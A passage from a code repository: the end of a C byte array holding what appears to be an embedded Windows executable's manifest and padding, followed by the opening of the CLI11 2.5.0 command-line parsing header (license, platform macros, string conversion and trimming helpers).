	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
	0x18, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
	0x02, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
	0x09, 0x04, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x60, 0x60, 0x00, 0x00,
	0x7D, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x3F, 0x78, 0x6D,
	0x6C, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x27, 0x31,
	0x2E, 0x30, 0x27, 0x20, 0x65, 0x6E, 0x63, 0x6F, 0x64, 0x69, 0x6E, 0x67,
	0x3D, 0x27, 0x55, 0x54, 0x46, 0x2D, 0x38, 0x27, 0x20, 0x73, 0x74, 0x61,
	0x6E, 0x64, 0x61, 0x6C, 0x6F, 0x6E, 0x65, 0x3D, 0x27, 0x79, 0x65, 0x73,
	0x27, 0x3F, 0x3E, 0x0D, 0x0A, 0x3C, 0x61, 0x73, 0x73, 0x65, 0x6D, 0x62,
	0x6C, 0x79, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3D, 0x27, 0x75, 0x72,
	0x6E, 0x3A, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2D, 0x6D, 0x69,
	0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2D, 0x63, 0x6F, 0x6D, 0x3A,
	0x61, 0x73, 0x6D, 0x2E, 0x76, 0x31, 0x27, 0x20, 0x6D, 0x61, 0x6E, 0x69,
	0x66, 0x65, 0x73, 0x74, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D,
	0x27, 0x31, 0x2E, 0x30, 0x27, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x74,
	0x72, 0x75, 0x73, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x20, 0x78, 0x6D, 0x6C,
	0x6E, 0x73, 0x3D, 0x22, 0x75, 0x72, 0x6E, 0x3A, 0x73, 0x63, 0x68, 0x65,
	0x6D, 0x61, 0x73, 0x2D, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66,
	0x74, 0x2D, 0x63, 0x6F, 0x6D, 0x3A, 0x61, 0x73, 0x6D, 0x2E, 0x76, 0x33,
	0x22, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x73, 0x65, 0x63,
	0x75, 0x72, 0x69, 0x74, 0x79, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x3C, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64,
	0x50, 0x72, 0x69, 0x76, 0x69, 0x6C, 0x65, 0x67, 0x65, 0x73, 0x3E, 0x0D,
	0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x72, 0x65,
	0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x45, 0x78, 0x65, 0x63, 0x75,
	0x74, 0x69, 0x6F, 0x6E, 0x4C, 0x65, 0x76, 0x65, 0x6C, 0x20, 0x6C, 0x65,
	0x76, 0x65, 0x6C, 0x3D, 0x27, 0x61, 0x73, 0x49, 0x6E, 0x76, 0x6F, 0x6B,
	0x65, 0x72, 0x27, 0x20, 0x75, 0x69, 0x41, 0x63, 0x63, 0x65, 0x73, 0x73,
	0x3D, 0x27, 0x66, 0x61, 0x6C, 0x73, 0x65, 0x27, 0x20, 0x2F, 0x3E, 0x0D,
	0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x72, 0x65, 0x71,
	0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6C,
	0x65, 0x67, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C,
	0x2F, 0x73, 0x65, 0x63, 0x75, 0x72, 0x69, 0x74, 0x79, 0x3E, 0x0D, 0x0A,
	0x20, 0x20, 0x3C, 0x2F, 0x74, 0x72, 0x75, 0x73, 0x74, 0x49, 0x6E, 0x66,
	0x6F, 0x3E, 0x0D, 0x0A, 0x3C, 0x2F, 0x61, 0x73, 0x73, 0x65, 0x6D, 0x62,
	0x6C, 0x79, 0x3E, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,
	0x08, 0xA1, 0x10, 0xA1, 0x68, 0xA1, 0x70, 0xA1, 0x68, 0xA2, 0x80, 0xA2,
	0x88, 0xA2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

```

`client/lib/cli.h`:

```h
// CLI11: Version 2.5.0
// Originally designed by Henry Schreiner
// https://github.com/CLIUtils/CLI11
//
// This is a standalone header file generated by MakeSingleHeader.py in CLI11/scripts
// from: v2.5.0
//
// CLI11 2.5.0 Copyright (c) 2017-2025 University of Cincinnati, developed by Henry
// Schreiner under NSF AWARD 1414736. All rights reserved.
//
// Redistribution and use in source and binary forms of CLI11, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
//    list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright notice,
//    this list of conditions and the following disclaimer in the documentation
//    and/or other materials provided with the distribution.
// 3. Neither the name of the copyright holder nor the names of its contributors
//    may be used to endorse or promote products derived from this software without
//    specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
// ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
// WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR
// ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
// (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
// LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON
// ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
// (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
// SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

#pragma once

// Standard combined includes:
#include <algorithm>
#include <array>
#include <cctype>
#include <clocale>
#include <cmath>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <cwchar>
#include <exception>
#include <fstream>
#include <functional>
#include <iomanip>
#include <iostream>
#include <iterator>
#include <limits>
#include <locale>
#include <map>
#include <memory>
#include <numeric>
#include <set>
#include <sstream>
#include <stdexcept>
#include <string>
#include <tuple>
#include <type_traits>
#include <utility>
#include <vector>


#define CLI11_VERSION_MAJOR 2
#define CLI11_VERSION_MINOR 5
#define CLI11_VERSION_PATCH 0
#define CLI11_VERSION "2.5.0"




// The following version macro is very similar to the one in pybind11
#if !(defined(_MSC_VER) && __cplusplus == 199711L) && !defined(__INTEL_COMPILER)
#if __cplusplus >= 201402L
#define CLI11_CPP14
#if __cplusplus >= 201703L
#define CLI11_CPP17
#if __cplusplus > 201703L
#define CLI11_CPP20
#if __cplusplus > 202002L
#define CLI11_CPP23
#if __cplusplus > 202302L
#define CLI11_CPP26
#endif
#endif
#endif
#endif
#endif
#elif defined(_MSC_VER) && __cplusplus == 199711L
// MSVC sets _MSVC_LANG rather than __cplusplus (supposedly until the standard was fully implemented)
// Unless you use the /Zc:__cplusplus flag on Visual Studio 2017 15.7 Preview 3 or newer
#if _MSVC_LANG >= 201402L
#define CLI11_CPP14
#if _MSVC_LANG > 201402L && _MSC_VER >= 1910
#define CLI11_CPP17
#if _MSVC_LANG > 201703L && _MSC_VER >= 1910
#define CLI11_CPP20
#if _MSVC_LANG > 202002L && _MSC_VER >= 1922
#define CLI11_CPP23
#endif
#endif
#endif
#endif
#endif

#if defined(CLI11_CPP14)
#define CLI11_DEPRECATED(reason) [[deprecated(reason)]]
#elif defined(_MSC_VER)
#define CLI11_DEPRECATED(reason) __declspec(deprecated(reason))
#else
#define CLI11_DEPRECATED(reason) __attribute__((deprecated(reason)))
#endif

// GCC < 10 doesn't ignore this in unevaluated contexts
#if !defined(CLI11_CPP17) ||                                                                                           \
    (defined(__GNUC__) && !defined(__llvm__) && !defined(__INTEL_COMPILER) && __GNUC__ < 10 && __GNUC__ > 4)
#define CLI11_NODISCARD
#else
#define CLI11_NODISCARD [[nodiscard]]
#endif

/** detection of rtti */
#ifndef CLI11_USE_STATIC_RTTI
#if (defined(_HAS_STATIC_RTTI) && _HAS_STATIC_RTTI)
#define CLI11_USE_STATIC_RTTI 1
#elif defined(__cpp_rtti)
#if (defined(_CPPRTTI) && _CPPRTTI == 0)
#define CLI11_USE_STATIC_RTTI 1
#else
#define CLI11_USE_STATIC_RTTI 0
#endif
#elif (defined(__GCC_RTTI) && __GXX_RTTI)
#define CLI11_USE_STATIC_RTTI 0
#else
#define CLI11_USE_STATIC_RTTI 1
#endif
#endif

/** <filesystem> availability */
#if defined CLI11_CPP17 && defined __has_include && !defined CLI11_HAS_FILESYSTEM
#if __has_include(<filesystem>)
// Filesystem cannot be used if targeting macOS < 10.15
#if defined __MAC_OS_X_VERSION_MIN_REQUIRED && __MAC_OS_X_VERSION_MIN_REQUIRED < 101500
#define CLI11_HAS_FILESYSTEM 0
#elif defined(__wasi__)
// As of wasi-sdk-14, filesystem is not implemented
#define CLI11_HAS_FILESYSTEM 0
#else
#include <filesystem>
#if defined __cpp_lib_filesystem && __cpp_lib_filesystem >= 201703
#if defined _GLIBCXX_RELEASE && _GLIBCXX_RELEASE >= 9
#define CLI11_HAS_FILESYSTEM 1
#elif defined(__GLIBCXX__)
// if we are using gcc and Version <9 default to no filesystem
#define CLI11_HAS_FILESYSTEM 0
#else
#define CLI11_HAS_FILESYSTEM 1
#endif
#else
#define CLI11_HAS_FILESYSTEM 0
#endif
#endif
#endif
#endif

/** <codecvt> availability */
#if !defined(CLI11_CPP26) && !defined(CLI11_HAS_CODECVT)
#if defined(__GNUC__) && !defined(__llvm__) && !defined(__INTEL_COMPILER) && __GNUC__ < 5
#define CLI11_HAS_CODECVT 0
#else
#define CLI11_HAS_CODECVT 1
#include <codecvt>
#endif
#else
#if defined(CLI11_HAS_CODECVT)
#if CLI11_HAS_CODECVT > 0
#include <codecvt>
#endif
#else
#define CLI11_HAS_CODECVT 0
#endif
#endif

/** disable deprecations */
#if defined(__GNUC__)  // GCC or clang
#define CLI11_DIAGNOSTIC_PUSH _Pragma("GCC diagnostic push")
#define CLI11_DIAGNOSTIC_POP _Pragma("GCC diagnostic pop")

#define CLI11_DIAGNOSTIC_IGNORE_DEPRECATED _Pragma("GCC diagnostic ignored \"-Wdeprecated-declarations\"")

#elif defined(_MSC_VER)
#define CLI11_DIAGNOSTIC_PUSH __pragma(warning(push))
#define CLI11_DIAGNOSTIC_POP __pragma(warning(pop))

#define CLI11_DIAGNOSTIC_IGNORE_DEPRECATED __pragma(warning(disable : 4996))

#else
#define CLI11_DIAGNOSTIC_PUSH
#define CLI11_DIAGNOSTIC_POP

#define CLI11_DIAGNOSTIC_IGNORE_DEPRECATED

#endif

/** Inline macro **/
#ifdef CLI11_COMPILE
#define CLI11_INLINE
#else
#define CLI11_INLINE inline
#endif



#if defined CLI11_HAS_FILESYSTEM && CLI11_HAS_FILESYSTEM > 0
#include <filesystem>  // NOLINT(build/include)
#else
#include <sys/stat.h>
#include <sys/types.h>
#endif




#ifdef CLI11_CPP17
#include <string_view>
#endif  // CLI11_CPP17

#if defined CLI11_HAS_FILESYSTEM && CLI11_HAS_FILESYSTEM > 0
#include <filesystem>
#include <string_view>  // NOLINT(build/include)
#endif                  // CLI11_HAS_FILESYSTEM



#if defined(_WIN32)
#if !(defined(_AMD64_) || defined(_X86_) || defined(_ARM_))
#if defined(__amd64__) || defined(__amd64) || defined(__x86_64__) || defined(__x86_64) || defined(_M_X64) ||           \
    defined(_M_AMD64)
#define _AMD64_
#elif defined(i386) || defined(__i386) || defined(__i386__) || defined(__i386__) || defined(_M_IX86)
#define _X86_
#elif defined(__arm__) || defined(_M_ARM) || defined(_M_ARMT)
#define _ARM_
#elif defined(__aarch64__) || defined(_M_ARM64)
#define _ARM64_
#elif defined(_M_ARM64EC)
#define _ARM64EC_
#endif
#endif

// first
#ifndef NOMINMAX
// if NOMINMAX is already defined we don't want to mess with that either way
#define NOMINMAX
#include <windef.h>
#undef NOMINMAX
#else
#include <windef.h>
#endif

// second
#include <winbase.h>
// third
#include <processthreadsapi.h>
#include <shellapi.h>
#endif


namespace CLI {


    /// Convert a wide string to a narrow string.
    CLI11_INLINE std::string narrow(const std::wstring& str);
    CLI11_INLINE std::string narrow(const wchar_t* str);
    CLI11_INLINE std::string narrow(const wchar_t* str, std::size_t size);

    /// Convert a narrow string to a wide string.
    CLI11_INLINE std::wstring widen(const std::string& str);
    CLI11_INLINE std::wstring widen(const char* str);
    CLI11_INLINE std::wstring widen(const char* str, std::size_t size);

#ifdef CLI11_CPP17
    CLI11_INLINE std::string narrow(std::wstring_view str);
    CLI11_INLINE std::wstring widen(std::string_view str);
#endif  // CLI11_CPP17

#if defined CLI11_HAS_FILESYSTEM && CLI11_HAS_FILESYSTEM > 0
    /// Convert a char-string to a native path correctly.
    CLI11_INLINE std::filesystem::path to_path(std::string_view str);
#endif  // CLI11_HAS_FILESYSTEM




    namespace detail {

#if !CLI11_HAS_CODECVT
        /// Attempt to set one of the acceptable unicode locales for conversion
        CLI11_INLINE void set_unicode_locale() {
            static const std::array<const char*, 3> unicode_locales{ {"C.UTF-8", "en_US.UTF-8", ".UTF-8"} };

            for (const auto& locale_name : unicode_locales) {
                if (std::setlocale(LC_ALL, locale_name) != nullptr) {
                    return;
                }
            }
            throw std::runtime_error("CLI::narrow: could not set locale to C.UTF-8");
        }

        template <typename F> struct scope_guard_t {
            F closure;

            explicit scope_guard_t(F closure_) : closure(closure_) {}
            ~scope_guard_t() { closure(); }
        };

        template <typename F> CLI11_NODISCARD CLI11_INLINE scope_guard_t<F> scope_guard(F&& closure) {
            return scope_guard_t<F>{std::forward<F>(closure)};
        }

#endif  // !CLI11_HAS_CODECVT

        CLI11_DIAGNOSTIC_PUSH
            CLI11_DIAGNOSTIC_IGNORE_DEPRECATED

            CLI11_INLINE std::string narrow_impl(const wchar_t* str, std::size_t str_size) {
#if CLI11_HAS_CODECVT
#ifdef _WIN32
            return std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(str, str + str_size);

#else
            return std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(str, str + str_size);

#endif  // _WIN32
#else   // CLI11_HAS_CODECVT
            (void)str_size;
            std::mbstate_t state = std::mbstate_t();
            const wchar_t* it = str;

            std::string old_locale = std::setlocale(LC_ALL, nullptr);
            auto sg = scope_guard([&] { std::setlocale(LC_ALL, old_locale.c_str()); });
            set_unicode_locale();

            std::size_t new_size = std::wcsrtombs(nullptr, &it, 0, &state);
            if (new_size == static_cast<std::size_t>(-1)) {
                throw std::runtime_error("CLI::narrow: conversion error in std::wcsrtombs at offset " +
                    std::to_string(it - str));
            }
            std::string result(new_size, '\0');
            std::wcsrtombs(const_cast<char*>(result.data()), &str, new_size, &state);

            return result;

#endif  // CLI11_HAS_CODECVT
        }

        CLI11_INLINE std::wstring widen_impl(const char* str, std::size_t str_size) {
#if CLI11_HAS_CODECVT
#ifdef _WIN32
            return std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().from_bytes(str, str + str_size);

#else
            return std::wstring_convert<std::codecvt_utf8<wchar_t>>().from_bytes(str, str + str_size);

#endif  // _WIN32
#else   // CLI11_HAS_CODECVT
            (void)str_size;
            std::mbstate_t state = std::mbstate_t();
            const char* it = str;

            std::string old_locale = std::setlocale(LC_ALL, nullptr);
            auto sg = scope_guard([&] { std::setlocale(LC_ALL, old_locale.c_str()); });
            set_unicode_locale();

            std::size_t new_size = std::mbsrtowcs(nullptr, &it, 0, &state);
            if (new_size == static_cast<std::size_t>(-1)) {
                throw std::runtime_error("CLI::widen: conversion error in std::mbsrtowcs at offset " +
                    std::to_string(it - str));
            }
            std::wstring result(new_size, L'\0');
            std::mbsrtowcs(const_cast<wchar_t*>(result.data()), &str, new_size, &state);

            return result;

#endif  // CLI11_HAS_CODECVT
        }

        CLI11_DIAGNOSTIC_POP

    }  // namespace detail

    CLI11_INLINE std::string narrow(const wchar_t* str, std::size_t str_size) { return detail::narrow_impl(str, str_size); }
    CLI11_INLINE std::string narrow(const std::wstring& str) { return detail::narrow_impl(str.data(), str.size()); }
    // Flawfinder: ignore
    CLI11_INLINE std::string narrow(const wchar_t* str) { return detail::narrow_impl(str, std::wcslen(str)); }

    CLI11_INLINE std::wstring widen(const char* str, std::size_t str_size) { return detail::widen_impl(str, str_size); }
    CLI11_INLINE std::wstring widen(const std::string& str) { return detail::widen_impl(str.data(), str.size()); }
    // Flawfinder: ignore
    CLI11_INLINE std::wstring widen(const char* str) { return detail::widen_impl(str, std::strlen(str)); }

#ifdef CLI11_CPP17
    CLI11_INLINE std::string narrow(std::wstring_view str) { return detail::narrow_impl(str.data(), str.size()); }
    CLI11_INLINE std::wstring widen(std::string_view str) { return detail::widen_impl(str.data(), str.size()); }
#endif  // CLI11_CPP17

#if defined CLI11_HAS_FILESYSTEM && CLI11_HAS_FILESYSTEM > 0
    CLI11_INLINE std::filesystem::path to_path(std::string_view str) {
        return std::filesystem::path{
    #ifdef _WIN32
            widen(str)
    #else
            str
    #endif  // _WIN32
        };
    }
#endif  // CLI11_HAS_FILESYSTEM




    namespace detail {
#ifdef _WIN32
        /// Decode and return UTF-8 argv from GetCommandLineW.
        CLI11_INLINE std::vector<std::string> compute_win32_argv();
#endif
    }  // namespace detail



    namespace detail {

#ifdef _WIN32
        CLI11_INLINE std::vector<std::string> compute_win32_argv() {
            std::vector<std::string> result;
            int argc = 0;

            auto deleter = [](wchar_t** ptr) { LocalFree(ptr); };
            // NOLINTBEGIN(*-avoid-c-arrays)
            auto wargv = std::unique_ptr<wchar_t* [], decltype(deleter)>(CommandLineToArgvW(GetCommandLineW(), &argc), deleter);
            // NOLINTEND(*-avoid-c-arrays)

            if (wargv == nullptr) {
                throw std::runtime_error("CommandLineToArgvW failed with code " + std::to_string(GetLastError()));
            }

            result.reserve(static_cast<size_t>(argc));
            for (size_t i = 0; i < static_cast<size_t>(argc); ++i) {
                result.push_back(narrow(wargv[i]));
            }

            return result;
        }
#endif

    }  // namespace detail




    /// Include the items in this namespace to get free conversion of enums to/from streams.
    /// (This is available inside CLI as well, so CLI11 will use this without a using statement).
    namespace enums {

        /// output streaming for enumerations
        template <typename T, typename = typename std::enable_if<std::is_enum<T>::value>::type>
        std::ostream& operator<<(std::ostream& in, const T& item) {
            // make sure this is out of the detail namespace otherwise it won't be found when needed
            return in << static_cast<typename std::underlying_type<T>::type>(item);
        }

    }  // namespace enums

    /// Export to CLI namespace
    using enums::operator<<;

    namespace detail {
        /// a constant defining an expected max vector size defined to be a big number that could be multiplied by 4 and not
        /// produce overflow for some expected uses
        constexpr int expected_max_vector_size{ 1 << 29 };
        // Based on http://stackoverflow.com/questions/236129/split-a-string-in-c
        /// Split a string by a delim
        CLI11_INLINE std::vector<std::string> split(const std::string& s, char delim);

        /// Simple function to join a string
        template <typename T> std::string join(const T& v, std::string delim = ",") {
            std::ostringstream s;
            auto beg = std::begin(v);
            auto end = std::end(v);
            if (beg != end)
                s << *beg++;
            while (beg != end) {
                s << delim << *beg++;
            }
            auto rval = s.str();
            if (!rval.empty() && delim.size() == 1 && rval.back() == delim[0]) {
                // remove trailing delimiter if the last entry was empty
                rval.pop_back();
            }
            return rval;
        }

        /// Simple function to join a string from processed elements
        template <typename T,
            typename Callable,
            typename = typename std::enable_if<!std::is_constructible<std::string, Callable>::value>::type>
        std::string join(const T& v, Callable func, std::string delim = ",") {
            std::ostringstream s;
            auto beg = std::begin(v);
            auto end = std::end(v);
            auto loc = s.tellp();
            while (beg != end) {
                auto nloc = s.tellp();
                if (nloc > loc) {
                    s << delim;
                    loc = nloc;
                }
                s << func(*beg++);
            }
            return s.str();
        }

        /// Join a string in reverse order
        template <typename T> std::string rjoin(const T& v, std::string delim = ",") {
            std::ostringstream s;
            for (std::size_t start = 0; start < v.size(); start++) {
                if (start > 0)
                    s << delim;
                s << v[v.size() - start - 1];
            }
            return s.str();
        }

        // Based roughly on http://stackoverflow.com/questions/25829143/c-trim-whitespace-from-a-string

        /// Trim whitespace from left of string
        CLI11_INLINE std::string& ltrim(std::string& str);

        /// Trim anything from left of string
        CLI11_INLINE std::string& ltrim(std::string& str, const std::string& filter);

        /// Trim whitespace from right of string
        CLI11_INLINE std::string& rtrim(std::string& str);

        /// Trim anything from right of string
        CLI11_INLINE std::string& rtrim(std::string& str, const std::string& filter);

        /// Trim whitespace from string
        inline std::string& trim(std::string& str) { return ltrim(rtrim(str)); }

        /// Trim anything from string
        inline std::string& trim(std::string& str, const std::string filter) { return ltrim(rtrim(str, filter), filter); }

        /// Make a copy of the string and then trim it
        inline std::string trim_copy(const std::string& str) {
            std::string s = str;
            return trim(s);
        }

        /// remove quotes at the front and back of a string either '"' or '\''
        CLI11_INLINE std::string& remove_quotes(std::string& str);

        /// remove quotes from all elements of a string vector and process escaped components
        CLI11_INLINE void remove_quotes(std::vector<std::string>& args);

        /// Add a leader to the beginning of all new lines (nothing is added
        /// at the start of the first line). `"; "` would be for ini files
        ///
        /// Can't use Regex, or this would be a subs.
        CLI11_INLINE std::string fix_newlines(const std::string& leader, std::string input);

        /// Make a copy of the string and then trim it, any filter string can be used (any char in string is filtered)
        inline std::string trim_copy(const std::string& str, const std::string& filter) {
            std::string s = str;
            return trim(s, filter);
        }

        /// Print subcommand aliases
        CLI11_INLINE std::ostream& format_aliases(std::ostream& out, const std::vector<std::string>& aliases, std::size_t wid);

        /// Verify the first character of an option
        /// - is a trigger character, ! has special meaning and new lines would just be annoying to deal with
        template <typename T> bool valid_first_char(T c) {
            return ((c != '-') && (static_cast<unsigned char>(c) > 33));  // space and '!' not allowed
        }

        /// Verify following characters of an option
        template <typename T> bool valid_later_char(T c) {
            // = and : are value separators, { has special meaning for option defaults,
            // and control codes other than tab would just be annoying to deal with in many places allowing space here has too
            // much potential for inadvertent entry errors and bugs
            return ((c != '=') && (c != ':') && (c != '{') && ((static_cast<unsigned char>(c) > 32) || c == '\t'));
        }

        /// Verify an option/subcommand name
